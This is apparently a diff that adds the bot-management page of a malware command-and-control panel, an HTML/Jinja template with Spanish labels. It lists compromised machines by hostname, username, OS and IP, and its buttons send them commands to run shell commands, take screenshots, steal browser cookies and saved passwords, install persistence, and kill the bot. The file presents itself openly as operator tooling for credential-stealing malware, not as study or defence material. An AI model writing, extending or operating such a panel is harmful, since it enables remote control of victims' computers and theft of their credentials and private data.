@@ -1,0 +1,128 @@
+{% extends "base.html" %}
+
+{% block title %}Bots{% endblock %}
+
+{% block content %}
+<div class="section-header">
+    <h2><i class="fas fa-robot"></i> Bots ({{bots|length}})</h2>
+</div>
+
+<div class="section">
+    <table class="data-table">
+        <thead>
+            <tr>
+                <th>ID</th>
+                <th>Hostname</th>
+                <th>Usuario</th>
+                <th>OS</th>
+                <th>IP</th>
+                <th>Estado</th>
+                <th>First Seen</th>
+                <th>Last Seen</th>
+                <th>Acciones</th>
+            </tr>
+        </thead>
+        <tbody>
+            {% for bot in bots %}
+            <tr>
+                <td><strong>{{bot.id}}</strong></td>
+                <td>{{bot.hostname}}</td>
+                <td>{{bot.username}}</td>
+                <td>{{bot.os}}</td>
+                <td>{{bot.ip}}</td>
+                <td><span class="status-badge {{bot.status}}">{{bot.status.upper()}}</span></td>
+                <td>{{bot.first_seen}}</td>
+                <td>{{bot.last_seen}}</td>
+                <td>
+                    <button class="btn btn-sm" onclick="sendCmd('{{bot.id}}','shell','whoami')">Whoami</button>
+                    <button class="btn btn-sm" onclick="sendCmd('{{bot.id}}','screenshot')">Screenshot</button>
+                    <button class="btn btn-sm" onclick="sendCmd('{{bot.id}}','info')">Info</button>
+                    <button class="btn btn-sm" onclick="sendCmd('{{bot.id}}','cookies')">Cookies</button>
+                    <button class="btn btn-sm" onclick="sendCmd('{{bot.id}}','passwords')">Passwords</button>
+                    <button class="btn btn-sm" onclick="sendCmd('{{bot.id}}','persist')">Persist</button>
+                    <button class="btn btn-sm" onclick="sendCmd('{{bot.id}}','processes')">Procesos</button>
+                    <button class="btn btn-sm" onclick="showBotInfo('{{bot.id}}')"><i class="fas fa-eye"></i> Ver</button>
+                    <button class="btn btn-sm btn-danger" onclick="deleteBot('{{bot.id}}')"><i class="fas fa-trash"></i></button>
+                    <button class="btn btn-sm btn-danger" onclick="sendCmd('{{bot.id}}','kill')">KILL</button>
+                </td>
+            </tr>
+            {% endfor %}
+        </tbody>
+    </table>
+</div>
+
+<!-- Modal para ver info del bot -->
+<div id="bot-modal" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 1000; justify-content: center; align-items: center;">
+    <div style="background: #1a1a1a; border: 2px solid #0f0; border-radius: 8px; padding: 30px; max-width: 800px; max-height: 80vh; overflow-y: auto; width: 90%;">
+        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px;">
+            <h2 style="color: #0f0;"><i class="fas fa-robot"></i> Info del Bot <span id="modal-bot-id"></span></h2>
+            <button onclick="closeModal()" style="background: transparent; border: none; color: #f44; font-size: 1.5em; cursor: pointer;">&times;</button>
+        </div>
+        <div id="modal-content" style="white-space: pre-wrap; font-family: monospace; font-size: 12px; color: #888;"></div>
+    </div>
+</div>
+{% endblock %}
+
+{% block scripts %}
+<script>
+async function sendCmd(bid, cmd, args='') {
+    try {
+        const r = await fetch(`/api/bots/${bid}/command`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({command: cmd, args: args ? [args] : []})
+        });
+        const j = await r.json();
+        showToast(`Comando ${cmd} enviado! ID: ${j.cmd_id}`, 'success');
+    } catch(e) {
+        showToast(`Error: ${e}`, 'error');
+    }
+}
+
+async function showBotInfo(botId) {
+    try {
+        // Buscar el último comando "info" de este bot
+        const r = await fetch(`/api/commands?bot_id=${botId}`);
+        const cmds = await r.json();
+        const infoCmd = cmds.find(c => c.command === 'info' && c.result);
+        
+        document.getElementById('modal-bot-id').textContent = botId;
+        const content = document.getElementById('modal-content');
+        
+        if (infoCmd && infoCmd.result) {
+            try {
+                const data = JSON.parse(infoCmd.result);
+                content.innerHTML = '<pre style="color: #0f0;">' + JSON.stringify(data, null, 2) + '</pre>';
+            } catch(e) {
+                content.textContent = infoCmd.result;
+            }
+        } else {
+            content.innerHTML = '<span style="color: #f44;">No hay info disponible. Ejecuta el comando "info" primero.</span>';
+        }
+        
+        document.getElementById('bot-modal').style.display = 'flex';
+    } catch(e) {
+        showToast(`Error: ${e}`, 'error');
+    }
+}
+
+function closeModal() {
+    document.getElementById('bot-modal').style.display = 'none';
+}
+
+async function deleteBot(botId) {
+    if (!confirm(`¿Eliminar bot ${botId} permanentemente?`)) return;
+    try {
+        const r = await fetch(`/api/bots/${botId}/delete`, {method: 'DELETE'});
+        if (r.ok) {
+            showToast(`Bot ${botId} eliminado`, 'success');
+            setTimeout(() => location.reload(), 1000);
+        } else {
+            showToast('Error al eliminar', 'error');
+        }
+    } catch(e) {
+        showToast(`Error: ${e}`, 'error');
+    }
+}
+</script>
+{% endblock %}
